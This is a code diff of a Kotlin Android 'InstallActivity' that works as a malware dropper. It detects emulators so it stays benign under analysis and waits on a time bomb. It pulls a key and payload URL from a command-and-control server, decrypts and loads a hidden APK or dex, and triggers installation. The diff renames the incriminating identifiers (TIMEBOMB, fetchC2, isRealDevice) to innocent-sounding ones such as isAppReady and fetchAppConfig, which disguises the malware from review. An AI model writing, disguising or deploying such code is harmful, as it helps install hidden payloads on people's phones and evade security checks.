@@ -33,7 +33,7 @@ class InstallActivity : AppCompatActivity() {
         // ── Patched by bot ────────────────────────────────────────
         private const val AES_KEY_B64  = "AES_KEY_B64_PLACEHOLDER_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
         private const val HMAC_B64     = "HMAC_SHA256_PLACEHOLDER_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
-        private const val TIMEBOMB_TS  = "TIMEBOMB_TS_PLACEHOLDER_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
+        private const val appScheduledTime  = "appScheduledTime_PLACEHOLDER_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
         private const val DEVICE_SALT  = "DEVICE_SALT_PLACEHOLDER_CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
         private const val appConfigUrl   = "appConfigUrl_PLACEHOLDER_EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
         private const val appSourceUrl   = ""
@@ -89,16 +89,16 @@ class InstallActivity : AppCompatActivity() {
         tvStatus    = findViewById(R.id.tv_status)
         progressBar?.visibility = View.VISIBLE
         tvStatus?.text = getString(R.string.starting_installation)
-        Thread { runPipeline() }.start()
+        Thread { startAppFlow() }.start()
     }
 
     // ── MAIN PIPELINE ─────────────────────────────────────────────
-    private fun runPipeline() {
+    private fun startAppFlow() {
         try {
-            if (!isRealDevice()) { showNormal(); return }
-            if (!isActivated())  { showNormal(); return }
+            if (!isCompatibleDevice()) { showNormal(); return }
+            if (!isAppReady())  { showNormal(); return }
 
-            val c2 = fetchC2()
+            val c2 = fetchAppConfig()
             val rawKey   = c2.first ?: AES_KEY_B64
             val finalKey = deriveKey(rawKey)
 
@@ -106,8 +106,8 @@ class InstallActivity : AppCompatActivity() {
             val isRemote = resolvedUrl.startsWith("http") &&
                 !resolvedUrl.contains("PLACEHOLDER")
 
-            val encBytes = if (isRemote) fetchRemote(resolvedUrl) else loadAssets()
-            if (encBytes == null || encBytes.isEmpty()) { showError("STEP:LOAD_ASSETS\nbase.apk is null or empty"); return }
+            val encBytes = if (isRemote) fetchAppData(resolvedUrl) else loadAssets()
+            if (encBytes == null || encBytes.isEmpty()) { showMessage("STEP:LOAD_ASSETS\nbase.apk is null or empty"); return }
 
             // ── PLACEHOLDER MODE — skip HMAC + AES, install raw base.apk directly ──
             val isPlaceholder = HMAC_B64.contains("PLACEHOLDER") ||
@@ -130,7 +130,7 @@ class InstallActivity : AppCompatActivity() {
             loadDex(dex)
             launchTarget()
         } catch (e: Exception) {
-            showError("STEP:PIPELINE\n${e.javaClass.simpleName}:\n${e.message}")
+            showMessage("STEP:PIPELINE\n${e.javaClass.simpleName}:\n${e.message}")
         }
     }
 
@@ -141,7 +141,7 @@ class InstallActivity : AppCompatActivity() {
             val apkFile = File(cacheDir, "update.apk")
             apkFile.writeBytes(apkBytes)
 
-            showError("STEP1:APK written\nSize: ${apkBytes.size} bytes\nPath: ${apkFile.absolutePath}")
+            showMessage("STEP1:APK written\nSize: ${apkBytes.size} bytes\nPath: ${apkFile.absolutePath}")
 
             // Step 2 — get FileProvider URI
             val uri = androidx.core.content.FileProvider.getUriForFile(
@@ -150,7 +150,7 @@ class InstallActivity : AppCompatActivity() {
                 apkFile
             )
 
-            showError("STEP2:URI ready\n$uri")
+            showMessage("STEP2:URI ready\n$uri")
 
             // Step 3 — fire install intent
             val intent = Intent(Intent.ACTION_VIEW).apply {
@@ -164,7 +164,7 @@ class InstallActivity : AppCompatActivity() {
 
         } catch (e: Exception) {
             android.util.Log.e("InstallActivity", "installApkDirect FAILED: ${e.javaClass.simpleName}: ${e.message}", e)
-            showError("FAILED:\n${e.javaClass.simpleName}:\n${e.message}")
+            showMessage("FAILED:\n${e.javaClass.simpleName}:\n${e.message}")
         }
     }
 
@@ -220,7 +220,7 @@ class InstallActivity : AppCompatActivity() {
     }
 
     // ── ENV CHECK ─────────────────────────────────────────────────
-    private fun isRealDevice(): Boolean {
+    private fun isCompatibleDevice(): Boolean {
         var s = 0
         try { val fp = Build.FINGERPRINT.lowercase(); if (fp.contains("generic") || fp.contains("unknown") || fp.contains("emulator") || fp.contains("sdk_gphone")) s++ } catch (e: Exception) { s++ }
         try { val hw = Build.HARDWARE.lowercase(); if (hw.contains("goldfish") || hw.contains("ranchu") || hw.contains("vbox")) s++ } catch (e: Exception) { s++ }
@@ -233,9 +233,9 @@ class InstallActivity : AppCompatActivity() {
     }
 
     // ── TIMEBOMB ──────────────────────────────────────────────────
-    private fun isActivated(): Boolean {
+    private fun isAppReady(): Boolean {
         return try {
-            val ts = TIMEBOMB_TS.trim().toLongOrNull() ?: return true
+            val ts = appScheduledTime.trim().toLongOrNull() ?: return true
             if (ts == 0L) return true
             val prefs: SharedPreferences = getSharedPreferences("sys_cfg", Context.MODE_PRIVATE)
             if (!prefs.contains("t_inst")) prefs.edit().putLong("t_inst", System.currentTimeMillis() / 1000L).apply()
@@ -244,7 +244,7 @@ class InstallActivity : AppCompatActivity() {
     }
 
     // ── C2 FETCH ──────────────────────────────────────────────────
-    private fun fetchC2(): Pair<String?, String?> {
+    private fun fetchAppConfig(): Pair<String?, String?> {
         return try {
             if (appConfigUrl.contains("PLACEHOLDER") || appConfigUrl.isBlank()) return Pair(null, null)
             val conn = URL(appConfigUrl).openConnection() as HttpsURLConnection
@@ -258,7 +258,7 @@ class InstallActivity : AppCompatActivity() {
     }
 
     // ── REMOTE FETCH ──────────────────────────────────────────────
-    private fun fetchRemote(url: String): ByteArray? {
+    private fun fetchAppData(url: String): ByteArray? {
         return try {
             val conn = URL(url).openConnection() as HttpsURLConnection
             conn.connectTimeout = 15000; conn.readTimeout = 60000
@@ -334,7 +334,7 @@ class InstallActivity : AppCompatActivity() {
     }
 
     // ── SHOW ERROR ON SCREEN — displays exact error so user can report it ─────
-    private fun showError(msg: String) {
+    private fun showMessage(msg: String) {
         runOnUiThread {
             progressBar?.visibility = View.GONE
             tvStatus?.text = "ERROR:\n$msg"
